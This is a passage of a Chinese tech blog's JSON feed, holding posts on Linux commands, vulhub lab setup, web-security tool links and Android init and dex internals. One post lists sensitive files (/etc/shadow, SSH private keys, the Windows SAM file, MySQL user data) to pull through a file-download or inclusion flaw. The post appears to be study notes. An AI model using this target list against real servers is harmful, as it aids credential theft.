            "content_html": "<p>记录一些 linux 环境下会用到的命令。<br />\n<span id=\"more\"></span></p>\n<ol>\n<li>\n<p>设置代理。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># export http_proxy=&#x27;http://windows 的 ip: 代理端口 &#x27;</span><br><span class=\"line\"># curl -vv google.com</span><br><span class=\"line\"># git config --global https.proxy http://windows 的 ip: 代理端口 </span><br><span class=\"line\"># git config --global https.proxy https://windows 的 ip: 代理端口 </span><br><span class=\"line\"># git config --global http.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br><span class=\"line\"># git config --global https.proxy &#x27;socks5://windows 的 ip: 代理端口 &#x27;</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>批量添加后缀名。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># find . -type f | awk -F &quot;.&quot; &#x27;&#123;print $2&#125;&#x27; | xargs -i -t mv ./&#123;&#125; ./&#123;&#125;.apk</span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>查看 python 版本。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  ls /usr/bin/python*</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>添加 python 版本。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>查看和更换 python 版本。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  update-alternatives --config python</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>解决 apt install 失败的问题<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># sudo apt-get install aptitude</span><br><span class=\"line\"># sudo aptitude install &lt;package-name&gt;</span><br></pre></td></tr></table></figure><br />\n 之后从 aptitude 提供的解决方案中选择一种使用。</p>\n</li>\n</ol>\n",
            "tags": [
                "linux",
                "linux"
            ]
        },
        {
            "id": "http://ericcd.com/2022/08/20/file-download/",
            "url": "http://ericcd.com/2022/08/20/file-download/",
            "title": "文件包含漏洞可以尝试下载的文件",
            "date_published": "2022-08-20T08:20:20.000Z",
            "content_html": "<p>记录一些利用文件下载漏洞下载的目标文件。<br />\n<span id=\"more\"></span><br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#    Windows</span><br><span class=\"line\">#    C:\\boot.ini// 查看系统版本 </span><br><span class=\"line\">#    C:\\Windows\\System32\\inetsrv\\MetaBase.xml//IIS 配置文件 </span><br><span class=\"line\">#    C:\\Windows\\repair\\sam // 存储系统初次安装的密码 </span><br><span class=\"line\">#    C:\\Program Files\\mysql\\my.ini//Mysql 配置 </span><br><span class=\"line\">#    C:\\Program Files\\mysql\\data\\mysql\\user.MYD//Mysql root</span><br><span class=\"line\">#    C:\\Windows\\php.ini//php 配置信息 </span><br><span class=\"line\">#    C:\\Windows\\my.ini//Mysql 配置信息 </span><br><span class=\"line\">#    C:\\Windows\\win.ini//Windows 系统的一个基本系统配置文件 </span><br><span class=\"line\">#   </span><br><span class=\"line\">#    Linux</span><br><span class=\"line\">#    /root/.ssh/authorized_keys</span><br><span class=\"line\">#    /root/.ssh/id_rsa</span><br><span class=\"line\">#    /root/.ssh/id_ras.keystore</span><br><span class=\"line\">#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 </span><br><span class=\"line\">#    /etc/passwd</span><br><span class=\"line\">#    /etc/shadow</span><br><span class=\"line\">#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 </span><br><span class=\"line\">#    /etc/my.cnf//mysql 配置文件 </span><br><span class=\"line\">#    /etc/httpd/conf/httpd.conf//apache 配置文件 </span><br><span class=\"line\">#    /root/.bash_history// 用户历史命令记录文件 </span><br><span class=\"line\">#    /root/.mysql_history//mysql 历史命令记录文件 </span><br><span class=\"line\">#    /proc/mounts// 记录系统挂载设备 </span><br><span class=\"line\">#    /porc/config.gz// 内核配置文件 </span><br><span class=\"line\">#    /var/lib/mlocate/mlocate.db// 全文件路径 </span><br><span class=\"line\">#    /porc/self/cmdline// 当前进程的 cmdline 参数 </span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/07/23/vulhub-command/",
            "url": "http://ericcd.com/2022/07/23/vulhub-command/",
            "title": "vulhub 相关命令",
            "date_published": "2022-07-23T03:45:16.000Z",
            "content_html": "<p>使用 vulhub 时会用到的命令。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"下载-vulhub\"><a class=\"anchor\" href=\"#下载-vulhub\">#</a> 下载 vulhub</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip</span><br><span class=\"line\"># unzip vulhub-master.zip</span><br><span class=\"line\"># cd vulhub-master</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"编译环境\"><a class=\"anchor\" href=\"#编译环境\">#</a> 编译环境</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># docker-compose build</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"启动环境\"><a class=\"anchor\" href=\"#启动环境\">#</a> 启动环境</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># docker-compose up -d</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"移除环境\"><a class=\"anchor\" href=\"#移除环境\">#</a> 移除环境</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># docker-compose down -v</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/07/19/aosp-related/",
            "url": "http://ericcd.com/2022/07/19/aosp-related/",
            "title": "aosp 配置",
            "date_published": "2022-07-19T11:19:16.000Z",
            "content_html": "<p>AOSP 配置过程中遇到的问题。<br />\n<span id=\"more\"></span><br />\n 环境：Ubuntu 18.04 ， Python3.6</p>\n<h1 id=\"网络问题\"><a class=\"anchor\" href=\"#网络问题\">#</a> 网络问题</h1>\n<p>设置 Proxy 或更换国内源</p>\n<h1 id=\"repo-安装\"><a class=\"anchor\" href=\"#repo-安装\">#</a> repo 安装</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  mkdir ~/bin</span><br><span class=\"line\">#  PATH=~/bin:$PATH</span><br><span class=\"line\">#  curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo</span><br><span class=\"line\">#  chmod a+x ~/bin/repo</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"python-版本控制\"><a class=\"anchor\" href=\"#python-版本控制\">#</a> python 版本控制</h1>\n<ol>\n<li>\n<p>查看 python 版本：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  ls /usr/bin/python*</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>添加 python 版本：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n<li>\n<p>查看和更换 python 版本：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#  update-alternatives --config python</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n</li>\n</ol>\n",
            "tags": [
                "Android",
                "Android"
            ]
        },
        {
            "id": "http://ericcd.com/2022/07/17/url-log/",
            "url": "http://ericcd.com/2022/07/17/url-log/",
            "title": "web 安全相关网站资源记录",
            "date_published": "2022-07-17T07:14:42.000Z",
            "content_html": "<p>记录一些学习到的 web 安全相关网站。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"搜索引擎\"><a class=\"anchor\" href=\"#搜索引擎\">#</a> 搜索引擎</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==\">https://www.shodan.io/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=\">https://www.webscan.cc/</span> （同 ip 查询）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2gv\">https://crt.sh/</span> （子域名查询）</p>\n<h1 id=\"学习资源\"><a class=\"anchor\" href=\"#学习资源\">#</a> 学习资源</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L2luZGV4Lmh0bWw=\">https://websec.readthedocs.io/zh/latest/index.html</span></p>\n<h1 id=\"扫描工具\"><a class=\"anchor\" href=\"#扫描工具\">#</a> 扫描工具</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubWFwLm9yZy8=\">https://nmap.org/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlbGxvZ29sZHNuYWtlbWFuL21hc25tYXBzY2FuLVYxLjA=\">https://github.com/hellogoldsnakeman/masnmapscan-V1.0</span>  （端口扫描器）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=\">https://github.com/EnableSecurity/wafw00f</span>  （WAF 扫描工具）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vdGVlbW8=\">https://github.com/bit4woo/teemo</span> （域名枚举工具）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==\">https://github.com/fuzzdb-project/fuzzdb</span> （Fuzz 工具）</p>\n<h1 id=\"相关资源\"><a class=\"anchor\" href=\"#相关资源\">#</a> 相关资源</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0x1Y2lmZXIxOTkzL2Ntc3ByaW50\">https://github.com/Lucifer1993/cmsprint</span>  （CMS 指纹库）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL000dGlyL0dpdGh1Yi1Nb25pdG9y\">https://github.com/M4tir/Github-Monitor</span> （漏洞发布监控工具）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzkzMjYyNTguaHRtbA==\">https://www.cnblogs.com/bmjoker/p/9326258.html</span> （sqlmap 思维导图）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3Rz\">https://github.com/TheKingOfDuck/fuzzDicts</span> （Fuzz 字典）<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==\">https://github.com/s0md3v/XSStrike</span> （XSS 绕过工具）</p>\n<h1 id=\"sql-注入\"><a class=\"anchor\" href=\"#sql-注入\">#</a> SQL 注入</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3lvdW5neWFuZ3lhbmcwNC9Ob1NRTEF0dGFjaw==\">https://github.com/youngyangyang04/NoSQLAttack</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8v\">http://ceye.io/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FET09PL0Ruc2xvZ1NxbGluag==\">https://github.com/ADOOO/DnslogSqlinj</span></p>\n",
            "tags": [
                "web",
                "web"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/31/Android-Framework-init-rc/",
            "url": "http://ericcd.com/2022/03/31/Android-Framework-init-rc/",
            "title": "Android 框架 - init.rc 文件",
            "date_published": "2022-03-31T03:26:29.000Z",
            "content_html": "<p>Android 框架中 init.rc 文件的相关知识。<br />\n<span id=\"more\"></span><br />\ninit.rc 文件不同于 init 进程，init 进程仅当编译完 Android 后才会生成，而 init.rc 文件存在于源码中。init 文件大致分为两部分，一部分是以 on 关键字开头的动作列表，一部分是以 service 关键字开头的服务列表。</p>\n",
            "tags": [
                "Android",
                "Knowledge"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/23/AndroidFramework-init/",
            "url": "http://ericcd.com/2022/03/23/AndroidFramework-init/",
            "title": "Android 框架 - init 进程",
            "date_published": "2022-03-23T03:25:48.000Z",
            "content_html": "<p>Android 框架中 init 进程的相关知识。<br />\n<span id=\"more\"></span><br />\ninit 进程是 Android 启动后，由内核启动的第一个用户级进程。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 内核启动过程：</span><br><span class=\"line\">#    start_kernel ()</span><br><span class=\"line\">#    init_post ()</span><br><span class=\"line\">#    run_init_process ()</span><br><span class=\"line\">#</span><br><span class=\"line\">#     static in noinline init_post (void)</span><br><span class=\"line\">#     &#123;</span><br><span class=\"line\">#               if (execute_command)&#123;</span><br><span class=\"line\">#                          run_init_process (execute_command);</span><br><span class=\"line\">#               &#125;</span><br><span class=\"line\">#               run_init_process (&quot;/sbin/init&quot;);</span><br><span class=\"line\">#               run_init_process (&quot;/etc/init&quot;);</span><br><span class=\"line\">#               run_init_process (&quot;/bin/init&quot;);</span><br><span class=\"line\">#               run_init_process (&quot;/bin/sh&quot;);</span><br><span class=\"line\">#     &#125;</span><br></pre></td></tr></table></figure><br />\ninit_post () 函数调用 run_init_process () 函数，获取注册在 execute_command 中的进程文件路径，执行 execve () 系统调用，execve () 函数执行参数传递过来的文件路径下的进程 。<br />\n当跟文件系统顶层目录中不存在 init 进程或未指定启动选项 &quot;init=&quot; 时，内核会到 /sbin,/etc,/bin 目录下查找 init 文件，如果仍未找到，则 init 进程停止，引发 Kernel Panic。</p>\n<h1 id=\"init-工作流程\"><a class=\"anchor\" href=\"#init-工作流程\">#</a> init 工作流程</h1>\n<h2 id=\"sigchld-注册信号处理器\"><a class=\"anchor\" href=\"#sigchld-注册信号处理器\">#</a> SIGCHLD 注册信号处理器</h2>\n<p>当子进程终止时，会产生 SIGCHLD 信号，init 进程调用信号安装函数 sigaction ()，并通过参数传递至 sigaction 结构体中，完成信号处理器安装。<br />\ninit 进程通过相关代码注册与子进程相关的 SIGCHLD 信号处理器，并把 sigaction 结构体中的 sa_flags 设置为 SA_NOCLDSTOP，该值表示仅当进程终止时才接受 SIGCHLD 信号。sigchld_handler 函数用于通知全局变量 signal_fd，SIGCHLD 信号已经发生。</p>\n<h2 id=\"main-目录生成与挂载\"><a class=\"anchor\" href=\"#main-目录生成与挂载\">#</a> main () 目录生成与挂载</h2>\n<p>init 在注册完信号处理器后，创建并挂在启动所需目录。</p>\n<h2 id=\"初始化-log-输出设备\"><a class=\"anchor\" href=\"#初始化-log-输出设备\">#</a> 初始化 log 输出设备</h2>\n<p>通过调用 log_init () 函数初始化 log 输出设备。</p>\n<h2 id=\"解析-initrc-文件\"><a class=\"anchor\" href=\"#解析-initrc-文件\">#</a> 解析 init.rc 文件</h2>\n<p>init.rc 文件是 init 启动后执行的启动脚本，文件中记录着 init 进程执行的功能。在 Linux 系统中，它被定义在根文件系统的 /etc/rc.d/ 目录下，是启动时的可执行文件。<br />\ninit.rc 文件在 Android 系统运行过程中用于通用的环境设置以及进程相关的定义，init.{hardware}.rc 用于定义 Android 在不同平台下的特定进程和环境设置等。<br />\nparse_config_file () 文件用于分析.rc 配置文件，参数为文件路径。读取 init.rc 文件后，生成动作列表与服务列表。根据 init.{hardware}.rc 生成的动作列表和服务列表会被添加到已生成的对应列表中去。</p>\n<h2 id=\"执行-early-init-动作\"><a class=\"anchor\" href=\"#执行-early-init-动作\">#</a> 执行 early-init 动作</h2>\n<p>init 进程会依次执行 &quot;early-init , init ,early-boot , boot&quot; 片段中的命令。<br />\n通过 action_for_each_trigger () 将 early-init 中的命令保存到队列 action_add_queue_tail 中，之后通过 drain_action_queue () 函数将运行队列中的命令逐一取出执行。</p>\n<h2 id=\"创建定义好的设备节点文件\"><a class=\"anchor\" href=\"#创建定义好的设备节点文件\">#</a> 创建定义好的设备节点文件</h2>\n<p>通过 device_init () 生成静态设备节点。</p>\n<h2 id=\"初始化属性服务\"><a class=\"anchor\" href=\"#初始化属性服务\">#</a> 初始化属性服务</h2>\n<p>调用 property_init () 函数，在共享内存区域中，创建并初始化属性域。而后通过执行中的进程所提供的 API，访问属性域中的设置值。但更改属性值操作只能在 init 进程中运行，当修改属性值时，要预先向 init 进程提交值变更申请，然后 init 进程处理该申请，并修改属性值。</p>\n<h2 id=\"显示启动-logo\"><a class=\"anchor\" href=\"#显示启动-logo\">#</a> 显示启动 logo</h2>\n<p>使用 load_565rle_image () 函数将文件显示在屏幕上，只需修改 INIT_IMAGE_FILE 即可更改启动 Logo。</p>\n<h2 id=\"属性初始设置\"><a class=\"anchor\" href=\"#属性初始设置\">#</a> 属性初始设置</h2>\n<p>通过 property_set () 函数向属性域设置系统所需的一些初始值。这些设置的属性值由执行中的多种进程通过 property_get () API 来访问。</p>\n<h2 id=\"执行-init-动作\"><a class=\"anchor\" href=\"#执行-init-动作\">#</a> 执行 init 动作</h2>\n<p>同 early-init。</p>\n<h2 id=\"启动属性服务\"><a class=\"anchor\" href=\"#启动属性服务\">#</a> 启动属性服务</h2>\n<p>除了先前设置的属性外，start_property_service () 还会读取几个设置文件，并对属性进行初始化。在根文件系统的 /data/property 目录下，保存着进程生成或修改的属性值。向 init 提交修改申请后，init 进程生成 /dev/socket/property_service 来接受其它进程提交的申请。</p>\n<h2 id=\"创建套接字\"><a class=\"anchor\" href=\"#创建套接字\">#</a> 创建套接字</h2>\n<p>用于 init 进程在收到子进程终止的信号时调用相应的 handler。</p>\n<h2 id=\"执行与-action-list-的-early-bootbootproperty-相关的命令\"><a class=\"anchor\" href=\"#执行与-action-list-的-early-bootbootproperty-相关的命令\">#</a> 执行与 Action List 的 early-boot,boot,property 相关的命令</h2>\n<p>在 init.rc 文件的 boot 区段有一条 class_start 命令，用来逐一执行存在于服务列表中的进程列表。</p>\n<h2 id=\"设置事件处理循环的监视事件\"><a class=\"anchor\" href=\"#设置事件处理循环的监视事件\">#</a> 设置事件处理循环的监视事件</h2>\n<p>注册在 POLL 中的文件描述符会在 poll () 函数中等待事件发生，若事件发生，则从 poll 函数中跳出并处理事件。<br />\n在确认事件发生前，先要在 action list 的命令中确认是否有尚未执行的命令，并执行这些命令。起初，在事件处理循环中，action list 与 service list 未含有需要执行的事情，但是在处理过注册的事件后，init 进程要做的事情会重新注册到 action list 与 service list 中。<br />\n当事件发生时，事件信息会保存在 pollfd 结构体的 udfs.revents 变量中，当 poll () 函数返回后，可以在 udfs 数组中的 revents 中查看哪些事件已经发生。<br />\n当子进程终止时，会产生 SIGCHLD 信号，POLLIN 事件会被注册到 udfs [2],revents 中。<br />\n在 Android 系统运行过程中，插入热的拔插设备时，将生成设备节点文件。<br />\n这部分函数还会处理属性变更请求。</p>\n",
            "tags": [
                "Android",
                "Knowledge"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/23/Android-framework/",
            "url": "http://ericcd.com/2022/03/23/Android-framework/",
            "title": "Android 框架概述",
            "date_published": "2022-03-23T02:57:28.000Z",
            "content_html": "<p>Android 框架相关知识概述。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"android-启动过程\"><a class=\"anchor\" href=\"#android-启动过程\">#</a> Android 启动过程</h1>\n<p>Android 启动时，首先通过 bootloader (系统加载器) 加载 Linux 内核。Linux 加载启动时，先初始化内核，再调用 init 进程。</p>\n<h1 id=\"init-进程\"><a class=\"anchor\" href=\"#init-进程\">#</a> init 进程</h1>\n<p>init 进程会运行 Android Framework 所需的 Daemon, Context Manager, Media Server, Zygote 等。</p>\n<h2 id=\"daemon\"><a class=\"anchor\" href=\"#daemon\">#</a> Daemon</h2>\n<p>以下是 init 进程执行的 Daemon 进程。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#          USB Daemon (usbd): 管理 USB 连接。</span><br><span class=\"line\">#          Android Debug Bridge Daemon (adbd): Android Debug Brige 连接管理。</span><br><span class=\"line\">#          Debugger Daemon (debuggerd): 启动 Debugger 系统。</span><br><span class=\"line\">#          Radio Interface Layer Daemon (rild): 管理无线通信连接。</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"context-manager\"><a class=\"anchor\" href=\"#context-manager\">#</a> Context Manager</h2>\n<p>Context Manager 是一个管理 Android 系统服务的重要进程，系统服务提供从相机，音频，视频处理到各种应用程序制作所需要的 API。<br />\nContext Manager 还提供用于 Android 内的各种系统服务信息。应用程序或 Frameword 内部模块在调用系统服务时，需要先向服务管理器申请，再通过 Binder IPC 调用系统服务。<br />\n系统启动时，Android 所有系统服务都要把各自的 handle 注册到 Context Manager。</p>\n<h2 id=\"media-server\"><a class=\"anchor\" href=\"#media-server\">#</a> Media Server</h2>\n<p>Media Server 用于运行基于 C/C++ 的本地系统服务，如 Audio Flinger,Camera 等。</p>\n<h2 id=\"zygote\"><a class=\"anchor\" href=\"#zygote\">#</a> Zygote</h2>\n<p>Zygote 进程用于缩短 Android 应用程序加载时间，每当执行 java 应用程序时，Zygote 会派生一个子进程来执行程序，该子进程就是虚拟机。</p>\n<h2 id=\"system-server\"><a class=\"anchor\" href=\"#system-server\">#</a> System Server</h2>\n<p>Syetem Server 是 Android 系统的一个核心进程，它有 Zygote 创建，所以启动过程位于 Zygote 之后。在 System Server 中可以看到它建立的 Android 中的大部分服务，为了将运行在 System Server 中的 java 系统服务提供给 Android 程序或 Framework 内部模块调用，需要先将它们注册到 Context Manager 中。</p>\n",
            "tags": [
                "Android",
                "Knowledge"
            ]
        },
        {
            "id": "http://ericcd.com/2022/03/18/dex-structure/",
            "url": "http://ericcd.com/2022/03/18/dex-structure/",
            "title": "dex 文件结构",
            "date_published": "2022-03-18T02:42:11.000Z",
            "content_html": "<p>dex 文件结构学习。<br />\n<span id=\"more\"></span></p>\n<h1 id=\"dex-整体结构\"><a class=\"anchor\" href=\"#dex-整体结构\">#</a> dex 整体结构</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#       struct dex&#123;</span><br><span class=\"line\">#        Header;</span><br><span class=\"line\">#        string_ids;</span><br><span class=\"line\">#        type_ids;</span><br><span class=\"line\">#        proto_ids;</span><br><span class=\"line\">#        field_ids;</span><br><span class=\"line\">#        methods_ids;</span><br><span class=\"line\">#        class_defs;</span><br><span class=\"line\">#        data;</span><br><span class=\"line\">#        link_data;&#125;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"header\"><a class=\"anchor\" href=\"#header\">#</a> Header</h1>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#      struct  DexHeader&#123;</span><br><span class=\"line\">#              magic [8];</span><br><span class=\"line\">#              checksum;</span><br><span class=\"line\">#              signature [kSHA1DigestLen];</span><br><span class=\"line\">#              fileSize;</span><br><span class=\"line\">#              headerSize;</span><br><span class=\"line\">#              endianTag;</span><br><span class=\"line\">#              linkSize;</span><br><span class=\"line\">#              linkOff;</span><br><span class=\"line\">#              mapOff;</span><br><span class=\"line\">#              stringIdsSize;</span><br><span class=\"line\">#              stringIdsOff;</span><br><span class=\"line\">#              typeIdsSize;</span><br><span class=\"line\">#              typeIdsOff;</span><br><span class=\"line\">#              protoIdsSize;</span><br><span class=\"line\">#              protoIdsOff;</span><br><span class=\"line\">#              fieldIdsSize;</span><br><span class=\"line\">#              fieldIdsOff;</span><br><span class=\"line\">#              methodIdsSize;</span><br><span class=\"line\">#              methodIdsOff;</span><br><span class=\"line\">#              classDefsSize;</span><br><span class=\"line\">#              classDefsOff;</span><br><span class=\"line\">#              dataSize;</span><br><span class=\"line\">#              dataOff;&#125;</span><br></pre></td></tr></table></figure><br />\n1.checksum：dex 文件校验和。<br />\n2. signature [kSHA1DigestLen]：整个 dex 文件通过 SHA-1 签名得到的值，占用 20 字节，用于检验 dex 文件。<br />\n3.endianTag: 字节序标记，用于指定 dex 运行环境的 cpu。<br />\n4.linkSzie 和 linkOff：指定链接段大小和文件偏移，通常情况下都为 0.linkSize 为 0 的话表示静态链接。<br />\n5.mapOff：指定 DexMapList 的文件偏移。<br />\n6.stringIdsSize 和 stringIdsOff：指定了 dex 文件中所有用到的字符串的个数和 string_ids 结构位置偏移。<br />\n7.typeIdsSize 和 TypeIdsOff：表示类的类型的数量和 type_ids 结构位置偏移。<br />\n8.protoIdsSize 和 protoIdsOff：表示 dex 文件中方法原型的个数和 proto_ids 结构位置偏移。<br />\n9.fieldIdsSize 和 fieldsIdsOff：表示 dex 文件中字段个数和 field_ids 结构位置偏移。<br />\n10.methodIdsSize 和 methodIdsOff：表示 dex 文件中的方法数量和 methods_ids 结构位置偏移。<br />\n11.classDefsSize 和 classDefsOff：指明 dex 文件中类的定义的相关信息。</p>\n<h1 id=\"string_ids\"><a class=\"anchor\" href=\"#string_ids\">#</a> string_ids</h1>\n<p>string_ids 结构中，每 4 字节表示一个位置偏移，该偏移指向真正字符串的偏移地址，真正的字符串存在 data 中。</p>\n<h1 id=\"type_ids\"><a class=\"anchor\" href=\"#type_ids\">#</a> type_ids</h1>\n<p>types_ids 中只存在一种数据 descriptorIdx，它的值为 string_ids 